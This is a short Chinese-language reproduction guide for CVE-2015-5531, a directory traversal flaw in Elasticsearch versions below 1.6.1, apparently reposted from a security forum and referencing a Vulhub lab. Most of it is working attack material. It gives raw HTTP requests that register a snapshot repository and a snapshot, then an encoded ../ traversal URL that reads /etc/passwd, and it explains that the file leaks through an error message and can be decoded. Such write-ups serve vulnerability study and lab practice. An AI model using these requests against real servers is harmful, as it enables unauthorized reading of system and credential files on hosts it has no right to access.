# （CVE-2015-5531）ElasticSearch 目录穿越漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2906](https://www.zhihuifly.com/t/topic/2906)

# （CVE-2015-5531）ElasticSearch 目录穿越漏洞

## 一、漏洞简介

elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在`path.repo`，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。

## 二、漏洞影响

ElasticSearch 1.6.1以下

## 三、复现过程

### 1\. 新建一个仓库

```
PUT /_snapshot/test HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108 `{

“type”: “fs”,

“settings”: {

“location”: “/usr/share/elasticsearch/repo/test”

}

}` 
```

![image](img/95df34339291e6f25d03ebfe3efc7869.png)

### 2\. 创建一个快照

```
PUT /_snapshot/test2 HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108 `{

“type”: “fs”,

“settings”: {

“location”: “/usr/share/elasticsearch/repo/test/snapshot-backdata”

}

}` 
```

![image](img/b80cc7916c19b604274fde4677f51e3b.png)

### 3\. 目录穿越读取任意文件

访问 `http://www.0-sec.org:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`

![image](img/898a2cefd609dd5be7b6f1145a22da58.png)

如上图，在错误信息中包含文件内容（编码后），对其进行解码即可获得文件：

![image](img/0a757ed1042357e88733768bc4b2cd22.png)

## 参考链接

> https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/